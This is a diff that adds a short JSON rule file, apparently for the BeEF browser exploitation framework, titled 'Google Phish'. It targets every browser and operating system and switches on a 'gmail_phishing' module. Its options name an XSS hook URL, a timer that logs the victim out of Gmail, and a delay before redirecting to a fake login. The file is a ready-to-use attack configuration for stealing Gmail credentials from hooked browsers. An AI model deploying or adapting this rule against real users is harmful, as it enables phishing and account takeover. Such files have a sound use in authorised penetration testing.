@@ -1,0 +1,19 @@
+{
+  "name": "Google Phish",
+  "author": "heywoodlh",
+  "browser": "ALL",
+  "browser_version": "ALL",
+  "os": "ALL",
+  "os_version": "ALL",
+  "modules": [
+    { 
+      "name": "gmail_phishing",
+      "condition": "null",
+      "options": {
+        "xss_hook_url": "#{base_host}/demos/plain.html",
+        "logout_gmail_interval": "10000",
+        "wait_seconds_before_redirect": "1000"
+      }
+    }
+  ]
+}
